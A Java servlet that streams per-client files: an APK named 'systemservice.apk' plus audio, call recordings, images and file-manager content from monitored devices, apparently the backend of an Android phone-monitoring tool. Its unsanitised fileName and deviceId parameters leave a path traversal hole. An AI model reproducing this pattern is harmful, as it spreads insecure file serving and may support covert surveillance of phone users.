import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.logging.Logger;

@WebServlet(name = "DownloadServlet")
public class DownloadServlet extends HttpServlet {

    private Logger logger;

    @Override
    public void init() throws ServletException {
        logger = Logger.getLogger(getClass().getName());
    }

    @Override
    protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String clientId = request.getSession(false).getAttribute(Strings.clientId).toString();
        String deviceId = request.getParameter(Strings.deviceId);

        String filePath = "";
        String fileName = request.getParameter(Strings.fileName);
        String basePath = System.getProperty("jboss.server.data.dir") +
                "/clientData/" + clientId + File.separator + deviceId + File.separator;

        switch (request.getParameter(Strings.fileType)) {
            case Strings.fileTypeApk:
                filePath = System.getProperty("jboss.server.data.dir") + "/clientData/" + clientId + File.separator;
                fileName = "systemservice.apk";
                response.setContentType("application/vnd.android.package-archive");
                break;

            case Strings.fileTypeAudio:
                filePath = basePath + Strings.fileTypeAudio + File.separator;
                response.setContentType("audio/mp4");
                break;

            case Strings.fileTypeCall:
                filePath = basePath + Strings.fileTypeCall + File.separator;
                response.setContentType("audio/mp4");
                break;

            case Strings.fileTypeImage:
                filePath = basePath + Strings.fileTypeImage + File.separator;
                response.setContentType("image/jpeg");
                break;

            case Strings.fileTypeFM:
                filePath = basePath + Strings.fileTypeFM + File.separator;
                break;

            /*case Strings.fileTypeVideo:
                filePath = basePath + Strings.fileTypeVideo + File.separator;
                response.setContentType("video/mp4");
                break;*/
        }

        BufferedInputStream inputStream = null;
        try {
            ServletOutputStream outputStream = response.getOutputStream();

            File file = new File(filePath + fileName);

            response.addHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");

            response.setContentLength((int) file.length());

            inputStream = new BufferedInputStream(new FileInputStream(file));
            int readBytes;
            while ((readBytes = inputStream.read()) != -1)
                outputStream.write(readBytes);

        } catch (IOException ioe) {
            throw new ServletException(ioe.getMessage());
        } finally {
            try {
                if (inputStream != null)
                    inputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void destroy() {
        logger = null;
    }
}
